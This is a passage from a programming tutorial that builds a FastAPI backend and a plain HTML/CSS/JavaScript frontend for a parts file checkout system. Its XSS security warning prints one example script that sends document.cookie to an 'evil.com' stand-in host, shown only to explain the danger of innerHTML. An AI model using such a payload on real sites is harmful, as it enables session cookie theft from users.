    { "name": "PN1002_OP1.mcam", "status": "checked_out" },
    { "name": "PN1003_OP1.mcam", "status": "available" }
  ]
}
```

**What's Happening:**

1. You returned a Python dictionary with a list of dictionaries
2. FastAPI called `json.dumps()` automatically
3. Set the `Content-Type: application/json` header automatically
4. Sent it back to the client

You never touched JSON manually. This is FastAPI's magic.

---

## 1.7: Path Parameters - Dynamic URLs

What if you want to get info about a specific file?

### Add This Endpoint

```python
@app.get("/api/files/{filename}")
def get_file(filename: str):
    # The {filename} in the path is captured here
    return {
        "filename": filename,
        "status": "available",
        "size": "1.2 MB",
        "last_modified": "2025-10-01"
    }
```

### Test It

```bash
curl http://127.0.0.1:8000/api/files/PN1001_OP1.mcam
```

**Output:**

```json
{
  "filename": "PN1001_OP1.mcam",
  "status": "available",
  "size": "1.2 MB",
  "last_modified": "2025-10-01"
}
```

**Try different filenames:**

```bash
curl http://127.0.0.1:8000/api/files/TEST.mcam
curl http://127.0.0.1:8000/api/files/anything-works.txt
```

**What's Happening:**

- `{filename}` in the path is a **path parameter**
- FastAPI extracts it and passes it to your function
- The `: str` type hint tells FastAPI "this should be a string"

### Type Conversion

What if you want an integer parameter?

```python
@app.get("/api/parts/{part_number}")
def get_part(part_number: int):
    return {
        "part_number": part_number,
        "type": type(part_number).__name__
    }
```

**Test it:**

```bash
curl http://127.0.0.1:8000/api/parts/12345
```

**Output:**

```json
{ "part_number": 12345, "type": "int" }
```

Notice `part_number` is an integer, not a string!

**What if you pass a non-integer?**

```bash
curl http://127.0.0.1:8000/api/parts/not-a-number
```

**Output:**

```json
{
  "detail": [
    {
      "loc": ["path", "part_number"],
      "msg": "value is not a valid integer",
      "type": "type_error.integer"
    }
  ]
}
```

**FastAPI automatically validated and returned a helpful error!** This is Pydantic at work.

---

## 1.8: Query Parameters - Optional Filters

Path parameters are required. **Query parameters** are optional and come after `?`.

Example: `http://example.com/api/files?status=available&sort=name`

### Add a Search Endpoint

```python
@app.get("/api/search")
def search_files(
    query: str = "",
    status: str = "all",
    limit: int = 10
):
    return {
        "query": query,
        "status": status,
        "limit": limit,
        "results": f"Searching for '{query}' with status='{status}', showing {limit} results"
    }
```

**Understanding the Parameters:**

- `query: str = ""` - String, defaults to empty
- `status: str = "all"` - String, defaults to "all"
- `limit: int = 10` - Integer, defaults to 10

### Test It

**All defaults:**

```bash
curl "http://127.0.0.1:8000/api/search"
```

**With query parameter:**

```bash
curl "http://127.0.0.1:8000/api/search?query=PN1001"
```

**Multiple parameters:**

```bash
curl "http://127.0.0.1:8000/api/search?query=PN1001&status=available&limit=5"
```

**The `?` and `&` Syntax:**

- First parameter: `?query=value`
- Additional parameters: `&status=value&limit=value`

---

## 1.9: Async/Await - The Key to FastAPI's Speed

### The Problem: Blocking I/O

**Scenario:** Your endpoint needs to read a file from disk.

**Synchronous (Blocking) Code:**

```python
def get_file_sync(filename):
    # This BLOCKS - the entire program freezes
    with open(filename) as f:
        content = f.read()  # Takes 100ms
    return content
```

**What Happens:**

1. Request 1 arrives
2. Server starts reading file (100ms)
3. Request 2 arrives
4. Request 2 waits (can't start until Request 1 finishes)
5. Request 1 finishes, sends response
6. Request 2 starts processing

**Result:** Requests are handled one-at-a-time. Slow.

### The Solution: Async/Await

**Asynchronous (Non-Blocking) Code:**

```python
async def get_file_async(filename):
    # This does NOT block
    async with aiofiles.open(filename) as f:
        content = await f.read()  # Yields control during I/O
    return content
```

**What Happens:**

1. Request 1 arrives
2. Server starts reading file
3. **While waiting for disk**, Request 2 arrives
4. Request 2 starts processing immediately
5. Disk finishes for Request 1, sends response
6. Request 2 continues

**Result:** Server handles multiple requests concurrently. Fast.

### The Event Loop - How Async Works

**The Mental Model:**

Think of a restaurant with one chef (your CPU):

**Synchronous Kitchen:**

- Chef makes burger
- While burger cooks (5 min), chef stands there waiting
- Customer 2 waits in line
- Burger done, serve customer 1
- Now make customer 2's order

**Async Kitchen:**

- Chef makes burger, puts it on grill
- While burger cooks, chef starts customer 2's salad
- Burger done? Pause salad, serve burger
- Resume salad

**The async kitchen serves more customers faster** with the same number of chefs.

### Making Your Endpoints Async

**Synchronous endpoint (blocking):**

```python
@app.get("/slow")
def slow_endpoint():
    import time
    time.sleep(2)  # Simulates slow I/O
    return {"message": "Done"}
```

**Async endpoint (non-blocking):**

```python
@app.get("/fast")
async def fast_endpoint():
    import asyncio
    await asyncio.sleep(2)  # Simulates slow I/O
    return {"message": "Done"}
```

### The Rules

**When to use `async def`:**

- When your function uses `await`
- When you're doing I/O (database, files, HTTP requests)
- When you want FastAPI to handle the function asynchronously

**When to use regular `def`:**

- Simple, CPU-only operations
- No I/O operations
- You're not using `await` anywhere

**Key Point:** FastAPI can handle BOTH. It's smart about running sync functions in a thread pool so they don't block.

### Async Example - Simulating I/O

Add this to `main.py`:

```python
import asyncio

@app.get("/sync-slow")
def sync_slow():
    import time
    time.sleep(2)  # BLOCKS everything
    return {"message": "Sync done"}

@app.get("/async-fast")
async def async_fast():
    await asyncio.sleep(2)  # Does NOT block
    return {"message": "Async done"}
```

### Test Concurrency

**Terminal 1:**

```bash
time curl http://127.0.0.1:8000/sync-slow
```

**Terminal 2 (immediately after):**

```bash
time curl http://127.0.0.1:8000/sync-slow
```

**Result:** Second request waits ~4 seconds total (2 + 2).

**Now try async:**

**Terminal 1:**

```bash
time curl http://127.0.0.1:8000/async-fast
```

**Terminal 2 (immediately after):**

```bash
time curl http://127.0.0.1:8000/async-fast
```

**Result:** Both finish in ~2 seconds. They ran concurrently!

---

## 1.10: Request Body with POST

So far, we've only read data (GET). Let's accept data from the client (POST).

### Defining a Data Model

Create a new section in `main.py`:

```python
from pydantic import BaseModel

class FileCheckout(BaseModel):
    filename: str
    user: str
    message: str

@app.post("/api/checkout")
def checkout_file(checkout: FileCheckout):
    return {
        "success": True,
        "message": f"User '{checkout.user}' checked out '{checkout.filename}'",
        "details": checkout.message
    }
```

### Understanding Pydantic Models

**What is `FileCheckout`?**

- A **data model** - defines the shape of expected data
- Inherits from `BaseModel`
- Uses type hints to define fields
- **Automatically validates** incoming data

**What FastAPI Does:**

1. Receives JSON in request body
2. Validates it against `FileCheckout`
3. If valid, creates a `FileCheckout` object and passes it to your function
4. If invalid, returns 422 error with details

### Testing with curl

```bash
curl -X POST http://127.0.0.1:8000/api/checkout \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "PN1001_OP1.mcam",
    "user": "john_doe",
    "message": "Editing fixture plate"
  }'
```

**Response:**

```json
{
  "success": true,
  "message": "User 'john_doe' checked out 'PN1001_OP1.mcam'",
  "details": "Editing fixture plate"
}
```

### Testing Validation

**Missing a required field:**

```bash
curl -X POST http://127.0.0.1:8000/api/checkout \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "PN1001_OP1.mcam",
    "user": "john_doe"
  }'
```

**Response:**

```json
{
  "detail": [
    {
      "loc": ["body", "message"],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
```

Pydantic caught the missing field!

---

## 1.11: Error Handling

### Raising HTTP Exceptions

```python
from fastapi import HTTPException

@app.get("/api/files/{filename}")
def get_file_detail(filename: str):
    # Simulate checking if file exists
    valid_files = ["PN1001_OP1.mcam", "PN1002_OP1.mcam"]

    if filename not in valid_files:
        raise HTTPException(
            status_code=404,
            detail=f"File '{filename}' not found"
        )

    return {
        "filename": filename,
        "status": "available"
    }
```

**Test it:**

```bash
# Valid file
curl http://127.0.0.1:8000/api/files/PN1001_OP1.mcam

# Invalid file
curl http://127.0.0.1:8000/api/files/NOTREAL.mcam
```

**Second request returns:**

```json
{ "detail": "File 'NOTREAL.mcam' not found" }
```

With status code 404.

---

## 1.12: Logging - Seeing What's Happening

### Basic Python Logging

Add to the top of `main.py`:

```python
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)
```

### Using the Logger

```python
@app.get("/api/files")
def get_files():
    logger.info("Fetching all files")

    files = [
        {"name": "PN1001_OP1.mcam", "status": "available"},
        {"name": "PN1002_OP1.mcam", "status": "checked_out"}
    ]

    logger.info(f"Returning {len(files)} files")
    return {"files": files}
```

**Test it:**

```bash
curl http://127.0.0.1:8000/api/files
```

**Check your server terminal:**

```
2025-10-03 20:30:45 - main - INFO - Fetching all files
2025-10-03 20:30:45 - main - INFO - Returning 2 files
INFO:     127.0.0.1:54321 - "GET /api/files HTTP/1.1" 200 OK
```

You now have visibility into what your server is doing!

---

## 1.13: Automatic API Documentation

This is one of FastAPI's killer features.

### The Interactive Docs

**Visit in your browser:**

```
http://127.0.0.1:8000/docs
```

You'll see **Swagger UI** - an interactive API documentation page.

**What you can do:**

- See all your endpoints
- See required parameters
- **Try it out** - make requests directly from the browser
- See request/response examples

**Try it:**

1. Click on `GET /api/files`
2. Click "Try it out"
3. Click "Execute"
4. See the response right there

### Alternative Docs

**Visit:**

```
http://127.0.0.1:8000/redoc
```

This is **ReDoc** - a different documentation style, same data.

### How Does This Work?

**OpenAPI Specification:**

- FastAPI automatically generates an **OpenAPI schema** from your code
- The type hints (`filename: str`) become part of the schema
- Pydantic models become JSON Schema definitions
- The docs are generated from this schema

**View the raw schema:**

```
http://127.0.0.1:8000/openapi.json
```

This JSON describes your entire API. Other tools can consume it.

---

## 1.14: Testing with Pytest

### Install Testing Tools

```bash
pip install pytest httpx
```

**Why `httpx`?**

- FastAPI's test client uses it
- It's like `requests` but with async support

### Create Test File

Create `backend/test_main.py`:

```python
from fastapi.testclient import TestClient
from main import app

# Create a test client
client = TestClient(app)

def test_read_root():
    """Test the root endpoint"""
    response = client.get("/")
    assert response.status_code == 200
    assert response.json() == {"message": "Hello from the PDM Backend!"}

def test_get_files():
    """Test the files list endpoint"""
    response = client.get("/api/files")
    assert response.status_code == 200
    data = response.json()
    assert "files" in data
    assert len(data["files"]) > 0

def test_get_file_not_found():
    """Test 404 for non-existent file"""
    response = client.get("/api/files/NONEXISTENT.mcam")
    assert response.status_code == 404

def test_checkout_file():
    """Test checkout endpoint"""
    response = client.post(
        "/api/checkout",
        json={
            "filename": "PN1001_OP1.mcam",
            "user": "test_user",
            "message": "Testing checkout"
        }
    )
    assert response.status_code == 200
    data = response.json()
    assert data["success"] == True
```

### Run Tests

```bash
pytest test_main.py -v
```

**Output:**

```
test_main.py::test_read_root PASSED
test_main.py::test_get_files PASSED
test_main.py::test_get_file_not_found PASSED
test_main.py::test_checkout_file PASSED

====== 4 passed in 0.12s ======
```

### Understanding the Tests

**`TestClient(app)`**

- Creates a fake client
- Doesn't need a running server
- Makes real HTTP requests, but in-memory

**`assert` statements**

- If condition is `False`, test fails
- Tests are independent - they don't affect each other

**Test function names**

- Must start with `test_`
- Descriptive names explain what's being tested

---

## Stage 1 Complete - Your First API

### What You Built

You now have:

- A working FastAPI server with multiple endpoints
- GET endpoints with path and query parameters
- POST endpoint with data validation
- Error handling with proper HTTP status codes
- Logging for debugging
- Automated tests
- Auto-generated documentation

### Your Complete `main.py` (So Far)

```python
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import logging
import asyncio

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = FastAPI()

# Data model for checkout
class FileCheckout(BaseModel):
    filename: str
    user: str
    message: str

@app.get("/")
def read_root():
    return {"message": "Hello from the PDM Backend!"}

@app.get("/api/files")
def get_files():
    logger.info("Fetching all files")
    files = [
        {"name": "PN1001_OP1.mcam", "status": "available"},
        {"name": "PN1002_OP1.mcam", "status": "checked_out"},
        {"name": "PN1003_OP1.mcam", "status": "available"}
    ]
    logger.info(f"Returning {len(files)} files")
    return {"files": files}

@app.get("/api/files/{filename}")
def get_file_detail(filename: str):
    valid_files = ["PN1001_OP1.mcam", "PN1002_OP1.mcam", "PN1003_OP1.mcam"]

    if filename not in valid_files:
        raise HTTPException(
            status_code=404,
            detail=f"File '{filename}' not found"
        )

    return {
        "filename": filename,
        "status": "available",
        "size": "1.2 MB"
    }

@app.post("/api/checkout")
def checkout_file(checkout: FileCheckout):
    logger.info(f"Checkout: {checkout.user} -> {checkout.filename}")
    return {
        "success": True,
        "message": f"User '{checkout.user}' checked out '{checkout.filename}'",
        "details": checkout.message
    }

@app.get("/async-demo")
async def async_demo():
    logger.info("Starting async operation")
    await asyncio.sleep(1)
    logger.info("Async operation complete")
    return {"message": "Async done"}
```

### Verification Checklist

- [ ] FastAPI installed (`pip list | grep fastapi`)
- [ ] Server runs without errors (`uvicorn main:app --reload`)
- [ ] Can access root endpoint in browser
- [ ] Can view auto docs at `/docs`
- [ ] POST endpoint accepts JSON data
- [ ] Tests pass (`pytest test_main.py`)
- [ ] Understand async vs sync
- [ ] Know the difference between path and query parameters

### What's Next?

In **Stage 2**, we'll add a frontend. You'll learn:

- HTML structure and semantic tags
- CSS for styling
- JavaScript for interactivity
- How to serve static files from FastAPI
- Making fetch requests from JavaScript to your API

The pieces are coming together. You now have a working backend that can accept and return data. Next, we build the user interface.

---

**Copy this into MkDocs. When ready, request Stage 2.**

# Stage 2: First Frontend - HTML, CSS, and JavaScript Basics

## Introduction: The Goal of This Stage

Your backend can serve JSON, but JSON isn't a user interface. In this stage, you'll build the visual layer - the part users actually see and interact with.

By the end of this stage, you will:

- Serve static HTML/CSS/JS files from FastAPI
- Understand HTML document structure and semantic tags
- Apply CSS styling (box model, colors, basic layout)
- Manipulate the DOM with JavaScript
- Make your first fetch request from frontend to backend
- Display API data in the browser
- Handle user interactions with event listeners

**Time Investment:** 4-6 hours

---

## 2.1: The Frontend-Backend Relationship

### The Architecture

```
┌─────────────────┐         ┌──────────────────┐
│   Browser       │ ←──────→│   FastAPI        │
│   (Frontend)    │  HTTP   │   (Backend)      │
│                 │         │                  │
│  HTML           │         │  Python Code     │
│  CSS            │         │  Business Logic  │
│  JavaScript     │         │  Database Access │
└─────────────────┘         └──────────────────┘
```

**The Division of Labor:**

| Frontend          | Backend               |
| ----------------- | --------------------- |
| What user sees    | What user doesn't see |
| Presentation      | Business logic        |
| User interactions | Data processing       |
| HTML/CSS/JS       | Python/FastAPI        |
| Runs in browser   | Runs on server        |

**The Communication:** They talk via HTTP/JSON (which we built in Stage 1).

---

## 2.2: Serving Static Files from FastAPI

### Create the Frontend Folder

```bash
# In your pdm-tutorial directory
mkdir -p backend/static/css
mkdir -p backend/static/js
```

**Your structure should look like:**

```
pdm-tutorial/
├── backend/
│   ├── main.py
│   ├── test_main.py
│   └── static/
│       ├── index.html
│       ├── css/
│       │   └── style.css
│       └── js/
│           └── app.js
└── venv/
```

### Configure FastAPI to Serve Static Files

Update `backend/main.py`:

```python
from fastapi import FastAPI, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
from pydantic import BaseModel
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI()

# Mount static files directory
app.mount("/static", StaticFiles(directory="static"), name="static")

# Serve the main HTML file at the root
@app.get("/")
def serve_frontend():
    return FileResponse("static/index.html")

# Keep your existing API endpoints
@app.get("/api/files")
def get_files():
    logger.info("Fetching all files")
    files = [
        {"name": "PN1001_OP1.mcam", "status": "available"},
        {"name": "PN1002_OP1.mcam", "status": "checked_out"},
        {"name": "PN1003_OP1.mcam", "status": "available"}
    ]
    return {"files": files}

class FileCheckout(BaseModel):
    filename: str
    user: str
    message: str

@app.post("/api/checkout")
def checkout_file(checkout: FileCheckout):
    logger.info(f"Checkout: {checkout.user} -> {checkout.filename}")
    return {
        "success": True,
        "message": f"User '{checkout.user}' checked out '{checkout.filename}'"
    }
```

### Understanding Static File Serving

**`app.mount("/static", StaticFiles(directory="static"), name="static")`**

- **`/static`** - URL prefix (all static files accessed via `/static/...`)
- **`StaticFiles(directory="static")`** - Serves files from the `static` folder
- **`name="static"`** - Internal name for the mount

**How it works:**

1. User requests `http://localhost:8000/static/css/style.css`
2. FastAPI looks in `backend/static/css/style.css`
3. If found, sends the file with correct MIME type
4. If not found, returns 404

**`FileResponse("static/index.html")`**

- Sends a single file as the response
- Browser receives it and renders HTML

---

## 2.3: HTML - The Structure Layer

### Create Your First HTML File

Create `backend/static/index.html`:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>PDM - Parts Data Management</title>
    <link rel="stylesheet" href="/static/css/style.css" />
  </head>
  <body>
    <header>
      <h1>PDM System</h1>
      <p>Parts Data Management</p>
    </header>

    <main>
      <section id="file-list-section">
        <h2>Available Files</h2>
        <div id="file-list">
          <!-- Files will be loaded here by JavaScript -->
          <p>Loading files...</p>
        </div>
      </section>
    </main>

    <footer>
      <p>&copy; 2025 PDM Tutorial</p>
    </footer>

    <script src="/static/js/app.js"></script>
  </body>
</html>
```

### Understanding Every Line

**`<!DOCTYPE html>`**

- Tells browser "this is HTML5"
- Must be first line
- Not technically an HTML tag

**`<html lang="en">`**

- Root element - everything goes inside
- `lang="en"` tells screen readers and search engines the language

**`<head>` Section** - Metadata (not visible content)

**`<meta charset="UTF-8">`**

- Character encoding (supports all languages/symbols)
- UTF-8 can represent 1,112,064 different characters

**`<meta name="viewport" content="width=device-width, initial-scale=1.0">`**

- Makes site responsive on mobile
- `width=device-width` - match screen width
- `initial-scale=1.0` - no zoom on load

**`<title>`**

- Shows in browser tab
- Used by search engines
- Required in all HTML documents

**`<link rel="stylesheet" href="/static/css/style.css">`**

- Loads external CSS file
- `/static/css/style.css` is the path (remember the mount point?)

**`<body>` Section** - Visible content

**Semantic HTML Tags:**

| Tag         | Purpose           | Why Not Just `<div>`?                    |
| ----------- | ----------------- | ---------------------------------------- |
| `<header>`  | Page header       | Screen readers know it's navigation area |
| `<main>`    | Primary content   | SEO: search engines prioritize this      |
| `<section>` | Thematic grouping | Better structure than generic `<div>`    |
| `<footer>`  | Page footer       | Accessibility: skip navigation links     |

**`<script src="/static/js/app.js"></script>`**

- Loads JavaScript file
- Placed at END of `<body>` (we'll explain why shortly)

### Test It

**Restart your server:**

```bash
uvicorn main:app --reload
```

**Visit:**

```
http://127.0.0.1:8000
```

You should see a plain, unstyled page with "PDM System" and "Loading files..."

---

## 2.4: CSS - The Presentation Layer

### Create Your Stylesheet

Create `backend/static/css/style.css`:

```css
/* ============================================
   RESET & GLOBAL STYLES
   ============================================ */

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
    Ubuntu, Cantarell, sans-serif;
  line-height: 1.6;
  color: #333;
  background-color: #f5f5f5;
}

/* ============================================
   HEADER
   ============================================ */

header {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  color: white;
  padding: 2rem;
  text-align: center;
  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
}

header h1 {
  font-size: 2.5rem;
  margin-bottom: 0.5rem;
}

header p {
  font-size: 1.1rem;
  opacity: 0.9;
}

/* ============================================
   MAIN CONTENT
   ============================================ */

main {
  max-width: 1200px;
  margin: 2rem auto;
  padding: 0 1rem;
}

section {
  background: white;
  padding: 2rem;
  border-radius: 8px;
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
  margin-bottom: 2rem;
}

h2 {
  color: #667eea;
  margin-bottom: 1.5rem;
  font-size: 1.8rem;
}

/* ============================================
   FILE LIST
   ============================================ */

#file-list {
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

.file-item {
  padding: 1rem;
  border: 1px solid #e0e0e0;
  border-radius: 4px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  transition: all 0.3s ease;
}

.file-item:hover {
  background-color: #f9f9f9;
  border-color: #667eea;
  transform: translateX(5px);
}

.file-name {
  font-weight: 600;
  color: #333;
}

.file-status {
  padding: 0.25rem 0.75rem;
  border-radius: 12px;
  font-size: 0.9rem;
  font-weight: 500;
}

.status-available {
  background-color: #d4edda;
  color: #155724;
}

.status-checked_out {
  background-color: #fff3cd;
  color: #856404;
}

/* ============================================
   FOOTER
   ============================================ */

footer {
  text-align: center;
  padding: 2rem;
  color: #666;
  font-size: 0.9rem;
}
```

### Understanding CSS Concepts

### The CSS Box Model

Every HTML element is a box. Understanding this is fundamental.

```
┌─────────────────────────────────────┐
│          MARGIN (transparent)       │
│  ┌──────────────────────────────┐  │
│  │   BORDER                     │  │
│  │  ┌───────────────────────┐  │  │
│  │  │   PADDING             │  │  │
│  │  │  ┌────────────────┐  │  │  │
│  │  │  │    CONTENT     │  │  │  │
│  │  │  │                │  │  │  │
│  │  │  └────────────────┘  │  │  │
│  │  └───────────────────────┘  │  │
│  └──────────────────────────────┘  │
└─────────────────────────────────────┘
```

**`box-sizing: border-box;`**

- Changes how width is calculated
- **Without it:** width = content width (padding/border added on top)
- **With it:** width = total width (padding/border included)

**Example:**

```css
.box {
  width: 200px;
  padding: 20px;
  border: 5px solid black;
}
```

**Default (`content-box`):** Total width = 200 + 40 (padding) + 10 (border) = 250px  
**With `border-box`:** Total width = 200px (includes everything)

**Why `* { box-sizing: border-box; }`?**

- Applies to ALL elements (`*` = universal selector)
- Makes layout math easier
- Industry standard practice

### CSS Selectors

```css
/* Element selector - all <header> tags */
header {
  background: blue;
}

/* ID selector - element with id="file-list" */
#file-list {
  display: flex;
}

/* Class selector - elements with class="file-item" */
.file-item {
  padding: 1rem;
}

/* Descendant selector - <p> inside <header> */
header p {
  color: white;
}

/* Pseudo-class - hover state */
.file-item:hover {
  background: gray;
}
```

**Specificity (which rule wins?):**

1. Inline styles (highest priority)
2. IDs (`#file-list`)
3. Classes (`.file-item`)
4. Elements (`header`)

### Colors in CSS

```css
/* Named colors */
color: red;

/* Hex codes (most common) */
color: #667eea; /* Purple */
/* Breakdown: #RR GG BB in hexadecimal */

/* RGB */
color: rgb(102, 126, 234);

/* RGBA (with transparency) */
background: rgba(0, 0, 0, 0.1); /* 10% opaque black */
```

### The `rem` Unit

```css
padding: 2rem;
```

**What is `rem`?**

- "Root em" - relative to root font size
- Root font size = browser default (usually 16px)
- `2rem` = 2 × 16px = 32px

**Why use `rem` instead of `px`?**

- Users can change browser font size (accessibility)
- Your layout scales automatically
- `1rem` at base size, `2rem` for double, etc.

**Other units:**

- `px` - Fixed pixels
- `%` - Percentage of parent
- `em` - Relative to parent font size (confusing with nesting)
- `vh/vw` - Viewport height/width (1vh = 1% of screen height)

### Refresh and See Styling

**Visit:** `http://127.0.0.1:8000`

Your page now has:

- Purple gradient header
- White content cards
- Styled layout
- Professional appearance

But still says "Loading files..." - we'll fix that with JavaScript.

---

## 2.5: JavaScript - The Behavior Layer

### The Document Object Model (DOM)

When the browser loads HTML, it creates a **tree structure** in memory called the DOM.

**Your HTML:**

```html
<body>
  <header>
    <h1>PDM System</h1>
  </header>
  <main>
    <div id="file-list"></div>
  </main>
</body>
```

**The DOM Tree:**

```
document
└── html
    └── body
        ├── header
        │   └── h1
        │       └── "PDM System" (text node)
        └── main
            └── div#file-list
```

**JavaScript can:**

- Navigate this tree
- Find elements
- Change content
- Add/remove elements
- Respond to user actions

### Create Your JavaScript File

Create `backend/static/js/app.js`:

```javascript
// ============================================
// WAIT FOR DOM TO LOAD
// ============================================

document.addEventListener("DOMContentLoaded", function () {
  console.log("DOM fully loaded");
  loadFiles();
});

// ============================================
// LOAD FILES FROM API
// ============================================

async function loadFiles() {
  console.log("Loading files from API...");

  try {
    // Make GET request to our API
    const response = await fetch("/api/files");

    // Check if request succeeded
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    // Parse JSON response
    const data = await response.json();
    console.log("Received data:", data);

    // Display files
    displayFiles(data.files);
  } catch (error) {
    console.error("Error loading files:", error);
    displayError("Failed to load files. Please refresh the page.");
  }
}

// ============================================
// DISPLAY FILES IN THE DOM
// ============================================

function displayFiles(files) {
  // Find the container element
  const container = document.getElementById("file-list");

  // Clear loading message
  container.innerHTML = "";

  // Check if we have files
  if (!files || files.length === 0) {
    container.innerHTML = "<p>No files found.</p>";
    return;
  }

  // Create HTML for each file
  files.forEach((file) => {
    const fileElement = createFileElement(file);
    container.appendChild(fileElement);
  });

  console.log(`Displayed ${files.length} files`);
}

// ============================================
// CREATE A SINGLE FILE ELEMENT
// ============================================

function createFileElement(file) {
  // Create the container div
  const div = document.createElement("div");
  div.className = "file-item";

  // Create file name span
  const nameSpan = document.createElement("span");
  nameSpan.className = "file-name";
  nameSpan.textContent = file.name;

  // Create status span
  const statusSpan = document.createElement("span");
  statusSpan.className = `file-status status-${file.status}`;
  statusSpan.textContent = file.status.replace("_", " ");

  // Assemble the pieces
  div.appendChild(nameSpan);
  div.appendChild(statusSpan);

  return div;
}

// ============================================
// DISPLAY ERROR MESSAGE
// ============================================

function displayError(message) {
  const container = document.getElementById("file-list");
  container.innerHTML = `
        <div style="color: red; padding: 1rem; background: #fee; border-radius: 4px;">
            ${message}
        </div>
    `;
}
```

### Understanding JavaScript Concepts

### `DOMContentLoaded` Event

**Why wait for this event?**

```javascript
document.addEventListener("DOMContentLoaded", function () {
  loadFiles();
});
```

**The Problem:**

1. Browser starts loading HTML
2. Browser encounters `<script>` tag
3. **If script runs immediately**, DOM might not be fully built yet
4. `document.getElementById('file-list')` returns `null`
5. Your code crashes

**The Solution:**

- Wait for `DOMContentLoaded` event
- Browser fires this when DOM is fully parsed
- Now it's safe to manipulate elements

**Alternative:** Put `<script>` at END of `<body>` (which we did)

- By the time script loads, DOM is already built
- Either approach works; using the event is more explicit

### Async/Await in JavaScript

```javascript
async function loadFiles() {
  const response = await fetch("/api/files");
  const data = await response.json();
}
```

**Comparison to Python:**

| Python                   | JavaScript                     |
| ------------------------ | ------------------------------ |
| `async def loadFiles():` | `async function loadFiles() {` |
| `await fetch(...)`       | `await fetch(...)` (same!)     |
| Returns a coroutine      | Returns a Promise              |

**What's a Promise?**

- A Promise represents a future value
- It's in one of three states:
  - **Pending** - Operation not finished yet
  - **Fulfilled** - Operation succeeded, value available
  - **Rejected** - Operation failed, error available

**`await` unwraps the Promise:**

```javascript
// Without await (returns Promise)
const promise = fetch("/api/files");
console.log(promise); // Promise { <pending> }

// With await (waits for Promise to resolve, returns value)
const response = await fetch("/api/files");
console.log(response); // Response object
```

### The Fetch API

```javascript
const response = await fetch("/api/files");
```

**What `fetch()` does:**

1. Makes an HTTP request (default: GET)
2. Returns a Promise that resolves to a Response object
3. The Response contains the raw HTTP response

**The Response object:**

```javascript
response.status; // 200
response.statusText; // "OK"
response.headers; // Headers object
response.ok; // true if status 200-299
```

**Getting the body:**

```javascript
const data = await response.json(); // Parse as JSON
// or
const text = await response.text(); // Get as plain text
// or
const blob = await response.blob(); // Get as binary
```

**Why two `await` calls?**

```javascript
const response = await fetch("/api/files"); // Wait for HTTP response
const data = await response.json(); // Wait for body parsing
```

The response headers arrive first; the body might still be streaming.

### DOM Manipulation

**Finding elements:**

```javascript
// By ID
const el = document.getElementById("file-list");

// By class name (returns array-like object)
const items = document.getElementsByClassName("file-item");

// By CSS selector (modern, most flexible)
const el = document.querySelector("#file-list");
const items = document.querySelectorAll(".file-item");
```

**Creating elements:**

```javascript
const div = document.createElement("div");
div.className = "file-item";
div.textContent = "Some text";
```

**Adding to DOM:**

```javascript
container.appendChild(div); // Add as last child
container.insertBefore(div, ref); // Add before reference element
```

**Changing content:**

```javascript
el.textContent = "Plain text"; // Sets text (safe, can't inject HTML)
el.innerHTML = "<b>HTML</b>"; // Sets HTML (dangerous if user input!)
```

**⚠️ Security Warning: XSS**

**NEVER do this with user input:**

```javascript
// DANGEROUS!
el.innerHTML = userInput;
```

**Why?** User could input:

```html
<script>
  fetch("https://evil.com/steal?data=" + document.cookie);
</script>
```

**Safe alternative:**

```javascript
el.textContent = userInput; // Treats everything as plain text
```

---

## 2.6: Test the Complete Stack

### Open Browser Developer Tools

**Chrome/Edge:** Press `F12` or `Ctrl+Shift+I` (Windows) / `Cmd+Opt+I` (Mac)  
**Firefox:** Press `F12`

**The tabs you'll use:**

- **Elements/Inspector** - View and edit DOM
- **Console** - See `console.log()` output and errors
- **Network** - See HTTP requests
- **Sources** - Debug JavaScript

### Load the Page

Visit: `http://127.0.0.1:8000`

### Check the Console

You should see:

```
DOM fully loaded
Loading files from API...
Received data: {files: Array(3)}
Displayed 3 files
```

### Check the Network Tab

1. Click "Network" tab
2. Refresh the page (`F5`)
3. You'll see all requests:
   - `localhost` - The HTML file
   - `style.css` - The CSS file
   - `app.js` - The JavaScript file
   - `files` - The API request to `/api/files`

**Click on `files` request:**

- **Headers** tab shows request/response headers
- **Preview** tab shows formatted JSON
- **Response** tab shows raw JSON

**This is your entire frontend-backend communication visible!**

---

## 2.7: Adding User Interaction - Event Listeners

Let's add a button to reload the file list.

### Update HTML

Modify `backend/static/index.html`:

```html
<section id="file-list-section">
  <div
    style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;"
  >
    <h2>Available Files</h2>
    <button id="refresh-btn" class="btn">Refresh</button>
  </div>
  <div id="file-list">
    <p>Loading files...</p>
  </div>
</section>
```

### Update CSS

Add to `backend/static/css/style.css`:

```css
/* ============================================
   BUTTONS
   ============================================ */

.btn {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  color: white;
  border: none;
  padding: 0.75rem 1.5rem;
  border-radius: 4px;
  font-size: 1rem;
  cursor: pointer;
  transition: all 0.3s ease;
  font-weight: 500;
}

.btn:hover {
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
}

.btn:active {
  transform: translateY(0);
}
```

### Update JavaScript

Add to `backend/static/js/app.js`:

```javascript
document.addEventListener("DOMContentLoaded", function () {
